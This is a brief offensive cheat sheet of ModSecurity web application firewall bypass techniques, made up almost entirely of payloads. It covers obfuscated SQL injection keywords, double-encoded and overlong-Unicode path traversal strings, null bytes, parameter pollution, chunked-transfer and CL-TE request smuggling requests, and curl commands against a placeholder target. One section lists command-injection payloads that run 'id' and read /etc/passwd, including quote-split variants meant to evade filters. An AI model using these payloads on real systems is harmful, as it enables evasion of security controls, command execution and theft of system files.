# ModSecurity Bypass Techniques

## 1. Case Bypass
```
/AdMiN
/ADMIN
```

## 2. Comment Bypass
```sql
UN/**/ION SEL/**/ECT
SEL/**/ECT
```

## 3. Double Encoding
```
%252e%252e%252f
%2527 -> '
```

## 4. Unicode Bypass
```
%C0%AE -> .
%C0%AF -> /
%C0%27 -> '
```

## 5. Null Byte
```
%00
/admin%00
```

## 6. HTTP Parameter Pollution
```
?id=1&id=2
```

## 7. Chunked Transfer
```bash
curl -sk -X POST "http://target/" -H "Transfer-Encoding: chunked" -d "payload"
```

## 8. Request Smuggling
```bash
# CL-TE
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## 9. WAF Evasion — Alternatives
```bash
# Use different Content-Type
curl -sk "http://target/" -H "Content-Type: application/json" -d '{"query":"admin"}'
curl -sk "http://target/" -H "Content-Type: application/xml" -d '<query>admin</query>'
```

## 10. HTTP/2
```bash
curl -sk --http2 "http://target/"
```

## 11. WAF Rule Bypass — RCE
```bash
; id
| id
$(id)
`id`
{cat,/etc/passwd}
c'a't /etc/passwd
```

## 12. ModSecurity Paranoia Level Bypass
```bash
# Lower paranoia levels have fewer rules
# Test payloads that may bypass PL1
```
